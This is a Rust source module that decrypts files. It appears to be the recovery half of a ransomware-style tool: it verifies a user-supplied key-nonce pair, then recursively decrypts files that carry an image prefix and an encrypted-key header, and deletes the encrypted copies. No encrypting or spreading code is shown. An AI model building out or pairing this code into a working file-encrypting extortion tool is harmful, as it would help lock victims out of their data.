use std::fs::{self, File, OpenOptions, remove_file};
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;
use anyhow::{Context, Result};
use base64::Engine;
use chacha20poly1305::aead::stream::DecryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use decryptor::decrypt_file_chacha;
use decryptor::helpers::gen_new_path;
use crate::BIGRAT_PNG;
use crate::encryptor::{STATUS_VERIFY_ENCRYPTED_STR_LEN, STATUS_VERIFY_STR};

pub fn decode_pair_base64(pair_base64: &str) -> Result<([u8; 32], [u8; 19])> {
    let mut pair = [0u8; 32+19];
    // Ignoring trailing bits, because of the nature of base64
    // https://github.com/marshallpierce/rust-base64#i-want-canonical-base64-encodingdecoding
    base64::engine::general_purpose::STANDARD_NO_PAD.decode_slice(pair_base64.trim(), &mut pair)
        .with_context(|| "Error decoding base64 of encrypted key-nonce pair")?;

    Ok((
        <[u8; 32]>::try_from(&pair[..32])?,
        <[u8; 19]>::try_from(&pair[32..])?,
    ))
}

pub fn decrypt_recursive(
    path: &Path,
    key: &[u8; 32],
    nonce: &[u8; 19],
    encrypted_key: &[u8; 256],
) -> Result<()> {
    'entries: for entry in path.read_dir()? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            if let Err(err) = decrypt_recursive(&entry.path(), key, nonce, encrypted_key) {
                eprintln!("Error decrypting directory {:?}: {}", entry.path(), err);
            }
            continue;
        }

        let mut encrypted_file = File::open(entry.path())?;
        let dist_file_path = gen_new_path(entry.path().with_extension(""), false)?;
        let dist_file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&dist_file_path)?;

        if let Err(e) = encrypted_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64)) {
            eprintln!("Cannot read file {:?}: {e}", dist_file_path.display());
            fs::remove_file(&dist_file_path)?;
            continue;
        }
        let mut buffer = [0u8; 1];
        for byte in encrypted_key {
            if let Err(e) = encrypted_file.read(&mut buffer) {
                eprintln!("Cannot read file {:?}: {e}", entry.path().display());
                fs::remove_file(&dist_file_path)?;
                continue;
            }
            if byte != &buffer[0] {
                eprintln!(
                    "File {:?} is either not encrypted or encrypted with a different key",
                    entry.path().display(),
                );
                fs::remove_file(&dist_file_path)?;
                continue 'entries;
            }
        }

        if let Err(err) = decrypt_file_chacha(
            &encrypted_file,
            &dist_file,
            *key,
            *nonce
        ) {
            eprintln!("Failed to decrypt file \"{}\": {err}", entry.path().display());
            remove_file(dist_file_path)?;
            continue;
        }

        if let Err(err) = remove_file(entry.path()) {
            eprintln!("Failed to remove file \"{}\": {err}", entry.path().display());
        }
    }

    Ok(())
}

/// Verify user-supplied key-nonce pair against the verification string from the status file
/// Returns `true` if the string is successfully decrypted and matches the original
pub fn verify_supplied_pair(
    key: &[u8; 32],
    nonce: &[u8; 19],
    encrypted_verify_str: &[u8; STATUS_VERIFY_ENCRYPTED_STR_LEN],
) -> bool {
    let aead = XChaCha20Poly1305::new(key.into());
    let stream_decryptor = DecryptorBE32::from_aead(aead, nonce.as_ref().into());
    let decrypted_verify_str = stream_decryptor.decrypt_last(encrypted_verify_str.as_slice());

    match decrypted_verify_str {
        Ok(value) => {
            if value == STATUS_VERIFY_STR {
                true
            } else {
                eprintln!(
                    "Status verification string does not match: expected {:?}, found {:?}",
                    STATUS_VERIFY_STR,
                    value,
                );
                false
            }
        }
        Err(err) => {
            eprintln!("Error decrypting status verification string: {err}");
            false
        }
    }
}
